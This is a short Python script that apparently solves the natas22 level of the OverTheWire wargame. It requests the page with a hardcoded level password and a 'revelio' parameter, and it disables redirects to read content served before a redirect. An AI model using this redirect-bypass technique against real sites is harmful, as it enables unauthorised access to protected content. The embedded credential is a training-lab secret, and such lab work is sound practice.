import requests
from requests.auth import HTTPBasicAuth

url = "http://natas22.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas22", "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz")

params = { "revelio": "1" }

res = requests.get(url, params=params, auth=auth, allow_redirects=False)

print(res.text)
